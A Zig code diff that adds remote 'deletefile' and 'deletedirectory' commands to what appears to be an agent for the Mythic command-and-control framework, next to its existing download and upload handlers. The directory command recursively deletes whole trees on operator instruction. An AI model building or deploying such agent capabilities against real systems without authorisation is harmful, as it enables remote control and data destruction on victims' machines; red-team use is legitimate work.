@@ -31,6 +31,10 @@ pub const CommandExecutor = struct {
             return try self.executeDownload(task);
         } else if (std.mem.eql(u8, task.command, "upload")) {
             return try self.executeUpload(task);
+        } else if (std.mem.eql(u8, task.command, "deletefile")) {
+            return try self.deleteFile(task);
+        } else if (std.mem.eql(u8, task.command, "deletedirectory")) {
+            return try self.deleteDirectory(task);
         } else {
             return MythicResponse{
                 .task_id = task.id,
@@ -244,6 +248,68 @@ pub const CommandExecutor = struct {
         return MythicResponse{
             .task_id = task.id,
             .user_output = try std.fmt.allocPrint(self.allocator, "{s} ({d} bytes)", .{ remote_path, b64_content.len }),
+            .completed = true,
+            .status = "completed",
+        };
+    }
+
+    fn deleteFile(self: *CommandExecutor, task: MythicTask) !MythicResponse {
+        const Parameters = struct {
+            path: []const u8,
+        };
+        const parsed = try json.parseFromSlice(Parameters, self.allocator, task.parameters, .{});
+        defer parsed.deinit();
+        const path = parsed.value.path;
+        if (path.len == 0) {
+            return MythicResponse{
+                .task_id = task.id,
+                .user_output = "No path provided",
+                .completed = true,
+                .status = "error",
+            };
+        }
+        std.fs.deleteFileAbsolute(path) catch |err| {
+            return MythicResponse{
+                .task_id = task.id,
+                .user_output = try std.fmt.allocPrint(self.allocator, "Failed to delete file: {}", .{err}),
+                .completed = true,
+                .status = "error",
+            };
+        };
+        return MythicResponse{
+            .task_id = task.id,
+            .user_output = try std.fmt.allocPrint(self.allocator, "Deleted file: {s}", .{path}),
+            .completed = true,
+            .status = "completed",
+        };
+    }
+
+    fn deleteDirectory(self: *CommandExecutor, task: MythicTask) !MythicResponse {
+        const Parameters = struct {
+            path: []const u8,
+        };
+        const parsed = try json.parseFromSlice(Parameters, self.allocator, task.parameters, .{});
+        defer parsed.deinit();
+        const path = parsed.value.path;
+        if (path.len == 0) {
+            return MythicResponse{
+                .task_id = task.id,
+                .user_output = "No path provided",
+                .completed = true,
+                .status = "error",
+            };
+        }
+        std.fs.deleteTreeAbsolute(path) catch |err| {
+            return MythicResponse{
+                .task_id = task.id,
+                .user_output = try std.fmt.allocPrint(self.allocator, "Failed to delete directory: {}", .{err}),
+                .completed = true,
+                .status = "error",
+            };
+        };
+        return MythicResponse{
+            .task_id = task.id,
+            .user_output = try std.fmt.allocPrint(self.allocator, "Deleted directory: {s}", .{path}),
             .completed = true,
             .status = "completed",
         };
